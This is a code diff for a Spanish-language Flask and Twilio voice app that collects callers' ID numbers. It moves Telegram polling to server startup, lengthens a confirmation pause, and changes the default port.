@@ -138,6 +138,8 @@ def make_call():
     except Exception as e:
         logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
+    
+
 @app.route('/call-status-callback', methods=['POST'])
 def call_status_callback():
     """Endpoint para recibir actualizaciones de estado de llamada desde Twilio."""
@@ -418,12 +420,8 @@ def save_step3():
     data = global_user_sessions[call_sid]
     logger.info(f"⚠️ DATOS COMPLETOS PARA SID={call_sid}: {data}")
     
-    # NUEVO: Solo iniciar polling si la llamada fue iniciada desde Telegram
-    if 'telegram_chat_id' in global_user_sessions[call_sid]:
-        start_telegram_polling()
-        logger.info(f"🔄 Polling iniciado para llamada de Telegram: {call_sid}")
-    else:
-        logger.info(f"⏭️ Saltando inicio de polling para llamada manual: {call_sid}")
+    # REMOVIDO: Ya no necesitamos iniciar polling aquí porque está activo desde el inicio
+    # El polling ya está corriendo y puede manejar tanto llamadas manuales como de Telegram
     
     response = VoiceResponse()
     response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
@@ -434,8 +432,8 @@ def save_step3():
     
     # Agregar pausa de 3 segundos si son 7 dígitos
     if digit_length == 7:
-        logger.info(f"⏱️ Agregando pausa de 2 segundos para cédula de 7 dígitos")
-        response.pause(length=2)
+        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
+        response.pause(length=3)
     
     # Mensaje diferente dependiendo si es validación inicial o revalidación
     if is_revalidation:
@@ -840,9 +838,10 @@ if __name__ == '__main__':
     # Cargar sesiones previas
     global_user_sessions = load_sessions_from_file()
     
-    # REMOVIDO: start_telegram_polling() automático al iniciar
-    # El polling solo se iniciará cuando sea necesario
+    # NUEVO: Iniciar polling automáticamente pero solo una vez al inicio
+    start_telegram_polling()
+    logger.info("🚀 Servidor iniciado con polling de Telegram activo")
     
     # Usar el puerto que proporciona Railway
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
